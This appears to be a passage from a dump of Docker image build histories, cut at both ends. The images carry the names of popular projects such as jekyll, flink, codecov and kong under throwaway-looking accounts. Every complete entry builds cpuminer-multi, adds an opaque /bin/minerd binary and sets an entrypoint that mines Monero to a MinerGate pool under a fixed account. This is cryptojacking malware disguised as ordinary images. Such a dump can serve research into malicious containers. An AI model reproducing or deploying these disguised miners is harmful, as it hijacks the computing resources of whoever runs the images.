/run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zsqsisdaqcom/jekyll; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
visesutaphearcom/flink; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
yvghgluiistk/crate; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ygzwmailfscom/nuxeo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
aiprwierietk/codecov; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zznrcutoutclub/composer; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ynprpagamentitk/liferay; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
kzsluisgiisjsktk/viaduck; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
awormorriesworldml/known; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
fdprglubexcom/blackfire; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ceyonhostlabacom/abresk; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
bbqsglubexcom4/pypy; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
dufodaverdovcom/kong; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; 